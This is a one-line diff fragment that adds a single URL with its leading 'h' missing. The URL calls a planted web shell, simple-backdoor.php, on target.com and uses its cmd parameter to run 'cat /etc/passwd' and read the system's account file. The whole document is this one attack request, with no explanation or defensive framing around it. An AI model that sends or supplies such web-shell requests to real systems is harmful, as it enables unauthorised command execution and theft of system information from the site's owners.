@@ -1,0 +1,1 @@
+ttp://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
